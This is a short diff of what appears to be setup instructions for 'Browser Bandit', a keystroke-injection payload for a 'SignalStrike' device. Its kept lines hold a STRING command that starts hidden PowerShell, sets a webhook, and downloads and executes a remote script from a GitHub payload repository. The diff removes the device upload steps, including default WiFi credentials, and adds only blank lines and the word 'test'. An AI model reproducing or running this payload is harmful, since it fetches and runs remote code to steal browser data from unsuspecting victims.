@@ -43,11 +43,9 @@ SPACE
 STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
 ENTER
 
-3. Upload Your Payload to SignalStrike
 
-    Plug in your SignalStrike device.
-    Connect to its WiFi network (Default SSID: SignalStrike, Password: SignalStrike).
-    Open a web browser and go to 192.168.4.1 to access the control panel.
-    Create a new payload and name it "Browser Bandit".
-    Paste your modified Payload.txt (with the webhook) into the text box provided.
-    Save the payload and execute it.
+
+
+
+test
+
